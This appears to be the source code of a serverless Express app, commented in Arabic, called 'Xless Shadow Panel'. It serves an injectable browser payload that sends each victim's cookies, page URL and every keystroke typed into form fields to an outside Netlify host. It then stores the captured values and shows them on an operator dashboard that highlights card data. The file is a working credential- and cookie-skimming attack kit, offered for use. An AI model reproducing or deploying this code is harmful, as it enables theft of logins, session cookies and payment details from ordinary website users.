const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// مصفوفة لتخزين البيانات المسحوبة (في الذاكرة)
let capturedData = [];

// 1. استقبال البيانات المسحوبة
app.post('/api/exfiltrate', (req, res) => {
    const data = req.body;
    data.time = new Date().toLocaleString();
    capturedData.unshift(data); // إضافة البيانات الجديدة في الأعلى
    res.json({ status: 'success' });
});

// 2. جلب البيانات للوحة التحكم
app.get('/api/data', (req, res) => {
    res.json(capturedData);
});

// 3. الكود الذي سيتم حقنه في المتصفح (Payload)
app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    // هذا الكود يراقب كل حرف يكتبه المستخدم ويرسله فوراً
    const payload = `
        console.log('Xless Active');
        var target = 'https://willowy-kataifi-31efc6.netlify.app/api/exfiltrate';
        function send(d){
            fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)});
        }
        // إرسال البيانات الأولية (الرابط والكوكيز)
        send({ url: location.href, cookies: document.cookie, type: 'initial_hit' });
        
        // مراقبة جميع حقول الإدخال وسحب البيانات أثناء الكتابة
        document.addEventListener('input', function(e){
            var i = e.target;
            var n = (i.name || i.id || i.placeholder || '').toLowerCase();
            send({ 
                field: n, 
                value: i.value, 
                url: location.href,
                type: 'live_capture' 
            });
        });
    `;
    res.send(payload);
});

// 4. لوحة التحكم (Dashboard)
app.get('/dashboard', (req, res) => {
    res.send(\`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Xless Shadow Panel</title>
            <style>
                body{font-family:sans-serif;padding:20px;background:#0f0f0f;color:#00ff00}
                table{width:100%;border-collapse:collapse;background:#1a1a1a;margin-top:20px}
                th,td{padding:12px;border:1px solid #333;text-align:left}
                th{background:#004400;color:#fff}
                .card-data{color:#ff00ff;font-weight:bold}
                pre{white-space:pre-wrap;word-wrap:break-word;margin:0}
                .refresh-btn{padding:10px 20px;background:#00ff00;color:#000;border:none;cursor:pointer;font-weight:bold}
            </style>
        </head>
        <body>
            <h1>Xless Shadow Panel - [LIVE]</h1>
            <button class="refresh-btn" onclick="location.reload()">REFRESH DATA</button>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Field</th>
                        <th>Value (Captured)</th>
                        <th>Source URL</th>
                    </tr>
                </thead>
                <tbody id="data-body"></tbody>
            </table>
            <script>
                fetch('/api/data').then(r=>r.json()).then(data=>{
                    var html = "";
                    data.forEach(d=>{
                        var val = typeof d.value === 'string' ? d.value : JSON.stringify(d);
                        html += "<tr>" +
                            "<td>"+d.time+"</td>" +
                            "<td>"+(d.field || d.type)+"</td>" +
                            "<td class='card-data'>"+val+"</td>" +
                            "<td><small>"+d.url+"</small></td>" +
                        "</tr>";
                    });
                    document.getElementById('data-body').innerHTML = html || "<tr><td colspan='4'>Waiting for data...</td></tr>";
                });
            </script>
        </body>
        </html>
    \`);
});

module.exports.handler = serverless(app);
